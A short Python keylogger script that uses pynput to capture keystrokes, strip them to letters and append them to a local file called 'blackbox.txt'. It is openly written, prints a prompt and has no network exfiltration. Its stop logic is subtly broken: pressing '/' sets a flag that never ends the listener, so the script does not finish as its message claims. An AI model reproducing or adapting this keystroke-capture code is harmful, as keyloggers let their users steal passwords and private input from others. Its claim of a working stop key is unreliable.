import os
from pynput import keyboard
import time

# Use a string to store the captured keyboard input
key_logs = ""

# Create a flag to indicate the end of logging
end_logging_flag = False

# Define the key combination to end logging (e.g., pressing '/' key)
end_logging_key = "/"

# Define the path to the log file
log_file_path = os.path.join(os.getcwd(), 'blackbox.txt')

def report(logs):
    """
    Writes the contents of the keyboard logs to a text file named 'blackbox.txt'.
    """
    with open(log_file_path, 'a') as f:  # Use 'a' (append) mode to add to the file
        f.write(logs)

def on_key_press(key):
    global key_logs
    global end_logging_flag
    
    try:
        key_name = key.char
    except AttributeError:
        key_name = str(key)

    if key_name == end_logging_key:
        end_logging_flag = True
    else:
        key_logs += key_name

def on_key_release(key):
    pass

# Create a listener for keyboard events
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    print("Press '/' key to end logging.")
    listener.join()

# After logging is finished, write the key logs horizontally
key_logs = ''.join(filter(str.isalpha, key_logs))
if key_logs:
    report(key_logs)
    print("Logging finished.")
else:
    print("No keyboard input logged.")
